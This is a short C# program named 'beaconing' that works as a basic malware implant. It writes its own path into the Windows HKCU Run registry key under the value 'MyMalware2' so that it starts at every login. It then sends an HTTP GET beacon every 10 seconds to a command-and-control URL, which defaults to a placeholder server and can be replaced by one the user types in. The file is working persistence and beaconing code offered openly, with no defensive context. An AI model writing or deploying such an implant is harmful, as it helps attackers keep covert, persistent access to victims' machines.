using Microsoft.Win32;
using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Timers;
using Timer = System.Timers.Timer;

namespace beaconing
{
    class Beaconing
    {
        private static Timer _timer;
        private static HttpClient _client = new HttpClient();
        private static string _url = "http://your-command-and-control-server.com/beacon"; // URL for the beacon C2

        static async Task Main(string[] args)
        {
            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            AddToStartup(exePath);

            Console.WriteLine("Enter the C2 URL:");
            _url = Console.ReadLine();

            SetTimer();
            Console.WriteLine("Press any key to exit...");
            Console.ReadLine();
        }

        private static void SetTimer()
        {
            _timer = new Timer(10000); // 10 Second interval
            _timer.Elapsed += OnTimedEvent;
            _timer.AutoReset = true;
            _timer.Enabled = true;
        }

        private static async void OnTimedEvent(Object source, ElapsedEventArgs e)
        {
            await SendBeacon();
        }

        private static void AddToStartup(string exePath)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("MyMalware2", exePath);
            Console.WriteLine("Added to startup.");
        }

        private static async Task SendBeacon()
        {
            try
            {
                HttpResponseMessage response = await _client.GetAsync(_url); // Use the URL for the beacon C2
                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine("Beacon sent successfully.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Beacon failed: {ex.Message}");
            }
        }
    }

}